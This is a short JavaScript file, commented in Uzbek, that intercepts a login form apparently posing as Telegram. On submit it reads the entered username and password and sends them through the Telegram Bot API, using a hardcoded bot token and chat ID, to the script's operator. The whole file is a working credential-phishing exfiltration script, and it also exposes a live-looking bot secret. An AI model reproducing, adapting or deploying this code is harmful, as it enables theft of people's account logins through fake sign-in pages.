document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Foydalanuvchi nomi va parolni kodlash
        const username = encodeURIComponent(document.getElementById('username').value);
        const password = encodeURIComponent(document.getElementById('password').value);
        
        // Xabar matnini yangi qator belgilari bilan tuzish
        // const message = `Username: ${username} \n Password: ${password}`;
        
        const jonatish = `<b>Username:</b> <em>${username}</em>\n<b>Password:</b> <em>${password}</em>`
        
        // Telegram API uchun URL tuzish
        const url = `https://api.telegram.org/bot6681983180:AAFEgYgqQiWC4-0rAdlW7Vu_4RBUF_r6se4/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
        
        // fetch yordamida so'rov yuborish va natijani konsolda ko'rsatish
        fetch(url, { method: 'GET' })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));
    });
});
